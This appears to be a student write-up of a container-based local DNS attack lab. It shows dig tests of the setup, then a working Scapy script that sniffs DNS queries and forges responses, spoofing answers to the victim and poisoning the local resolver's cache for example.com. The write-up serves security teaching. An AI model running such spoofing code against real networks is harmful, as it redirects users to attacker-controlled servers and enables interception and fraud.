# Local DNS Lab
In this lab we are going to launch a local DNS attack. The network structure of the docker containers in this lab is shown below:
 ![a](/screenshots/net.png)

Here we have a local DNS server running bind9, a victim which uses the local DNS server, an attacker and a name server which is in control of the attacker.
Bind is configured to forward all the queries about domain `attacker32.com` to the attacker name server.

On the attacker nameserver we have to zones one for `attacker32.com` and one for `example.com`.

## Task 0: Testing the setup
first let's test that the user can connect to the local dns server and the local dns server can correctly forward the query to the attacker nameserver; For these we run the following dig command from the user container:

```bash
root@2f3d17df9e37:/# dig ns.attacker32.com

; <<>> DiG 9.16.1-Ubuntu <<>> ns.attacker32.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 10131
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 34b9abbeb6398d9b01000000614599962dd8316e6ec28230 (good)
;; QUESTION SECTION:
;ns.attacker32.com.             IN      A

;; ANSWER SECTION:
ns.attacker32.com.      259200  IN      A       10.9.0.153

;; Query time: 7 msec
;; SERVER: 10.9.0.53#53(10.9.0.53)
;; WHEN: Sat Sep 18 07:47:34 UTC 2021
;; MSG SIZE  rcvd: 90
```

We see that from server `10.9.0.53`(local DNS server ) we have an A record containing the IP address of attacker name server `10.9.0.153`.

Now let's dig `example.com`

```bash
root@2f3d17df9e37:/# dig www.example.com  

; <<>> DiG 9.16.1-Ubuntu <<>> www.example.com
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 54197
;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: 8096dab70d3d55cf010000006145a9f48b5c8ff285088252 (good)
;; QUESTION SECTION:
;www.example.com.               IN      A

;; ANSWER SECTION:
www.example.com.        86400   IN      A       93.184.216.34

;; Query time: 1396 msec
;; SERVER: 10.9.0.53#53(10.9.0.53)
;; WHEN: Sat Sep 18 08:57:24 UTC 2021
;; MSG SIZE  rcvd: 88

root@2f3d17df9e37:/# dig @ns.attacker32.com www.example.com

; <<>> DiG 9.16.1-Ubuntu <<>> @ns.attacker32.com www.example.com
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 13256
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
; COOKIE: ac4354402e1428ef010000006145aa08dee4f72f0dad03ea (good)
;; QUESTION SECTION:
;www.example.com.               IN      A

;; ANSWER SECTION:
www.example.com.        259200  IN      A       1.2.3.5

;; Query time: 0 msec
;; SERVER: 10.9.0.153#53(10.9.0.153)
;; WHEN: Sat Sep 18 08:57:44 UTC 2021
;; MSG SIZE  rcvd: 88
```

when we ask the local dns server about the `example.com`, because it's cache is empty; it would reach out to one of the root servers and do a recursive search to finally get the IP address of the authoritative nameserver of `example.com`; then it would ask that name sever about the `example.com` domain and get the actual IP address which is `93.184.216.34`.

now when we ask the attacker name server, which we normally would not; we get the attacker defined IP of `1.2.3.5`.

## Task 1
In this task we are going to sniff the local network for any dns queries that are about `example.com`; Now when victim digs the `www.example.com`; it sends a DNS query to the local dns server. Now if we are quicker than the local dns, we can forge a respond and send this to the victim before the local DNS does; this way we can forward victim to any server we like whenever he/she wants to visit `example.com`; to this end we write the following Scapy script:

```python
NS_NAME = "example.com"
def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src% --> %IP.dst%: %DNS.id%}"))
        # Create an IP object
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        # Create a UDP object
        udp = UDP(dport=pkt[UDP].sport, sport = 53)
        # Create an aswer record
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='2.3.4.5')
        # Create a DNS object
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0,qr=1,qdcount=1, ancount=1,nscount=0, arcount=0, an=Anssec)
        spoofpkt = ip/udp/dns
        #
        # Assemble the spoofed DNS packet
        send(spoofpkt)

# Set the filter
myFilter = "udp and dst port 53"
pkt=sniff(iface='br-e2f3384b00c9', filter=myFilter, prn=spoof_dns)

```
In scapy, we need to build up different layers of the response packet, whenever we receive a DNS packet which queries `example.com`; this is how we assemble the response:

* In the ip and udp layers we only need to swap the ip and port number of source and destination so that we trick the victim into believing this packet has actually come from the local DNS.

* In the application layer (DNS) we need to create a type A recored for the query with a valid ttl and any IP address we like and then put this record in the answer section and finally we also need to set some flags indicating that this message is for the response of the actual sent query.

This is the script in action:

 ![a](/screenshots/task1.png)

 As you can see the first dig, gets the correct IP address, but the second dig which is after the attacker has run the script, gets the incorrect IP address.
 Note that we needed to flush the local DNS cache for this to work. This is because after the first dig, the local DNS has the correct IP in cache and it would reply faster than us to the victim and so our packet would not have any impact. To slow down the local DNS, we flush it's cache so that it needs to retrieve the IP once again, and since the last time took more than two second, we can be sure that attacker response is going to be faster.

## Task 2

In this task we are going to **poison the DNS cache**. By this we mean that instead of responding to the victim DNS query, we are going to forge a respond to the local DNS DNS query, when it tries to reach the internet and resolve the IP of an unknown domain name. 
For this task we actually can use the previous script; because in the previous script we had not specified any specific source IP in the `filter` section. This means that actually in the previous experiment in addition to attacking to victim, we also have had poisoned the DNC cache. The below screenshot verifies this:
 ![a](/screenshots/task2.png)
 At first in the dns cache ,the ip address of `example.com` is stored correctly, We then flush this cache and start the script and then dig `example.com` from the user we start the recursive DNS query algorithm of the Local DNS; the attacker sniffs 3 DNS queries, the original one from the victim, which we kindly respond to; and two others coming from local DNS trying to ask the outside world about the IP of `example.com` which we respond to those to. This as you can see results in a poisoned cache.